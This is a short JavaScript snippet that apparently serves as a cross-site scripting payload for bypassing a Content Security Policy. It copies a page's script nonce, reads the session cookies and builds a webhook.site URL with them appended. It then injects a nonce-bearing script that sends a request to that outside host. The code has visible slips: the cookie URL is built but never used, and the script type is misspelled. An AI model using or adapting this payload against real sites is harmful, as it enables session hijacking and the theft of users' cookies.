var nounce = document.querySelectorAll("script")[1].nonce
var cook = document.cookie
var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
var s = document.createElement('script')
s.type = "text/javascipt"
s.innerHTML='var xhttp = new XMLHttpRequest(); xhttp.open("GET", "https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb", true); xhttp.send();'
s.setAttribute('nonce', nounce)
document.body.appendChild(s)
